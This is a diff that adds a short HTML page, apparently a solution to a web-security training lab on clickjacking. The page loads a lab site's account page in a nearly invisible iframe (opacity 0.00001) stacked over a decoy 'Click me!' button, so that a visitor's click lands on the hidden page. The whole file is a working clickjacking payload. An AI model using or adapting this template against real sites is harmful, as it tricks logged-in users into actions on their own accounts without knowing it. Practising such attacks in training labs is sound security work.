@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<head>
+    <style>
+      #target_website {
+        position:relative;
+        width:128px;
+        height:128px;
+        opacity:0.00001;
+        z-index:2;
+        }
+      #decoy_website {
+        position:absolute;
+        width:300px;
+        height:400px;
+        z-index:1;
+        }
+    </style>
+  </head>
+
+  <body>
+    <div id="decoy_website">
+    <button>Click me!</button>
+    </div>
+    <iframe id="target_website" src="https://aceb1fdc1f288ddc80786a3a000700ea.web-security-academy.net/account">
+    </iframe>
+  </body>
+</html>
